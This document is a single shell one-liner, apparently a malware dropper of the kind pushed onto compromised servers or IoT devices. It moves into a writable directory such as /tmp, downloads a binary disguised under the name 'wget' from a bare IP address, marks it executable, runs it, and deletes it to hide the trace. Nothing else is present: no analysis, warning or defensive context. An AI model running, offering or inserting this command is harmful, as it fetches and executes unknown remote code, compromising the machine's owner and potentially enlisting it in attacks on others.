cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.242/wget; chmod +x wget; ./wget; rm -rf wget
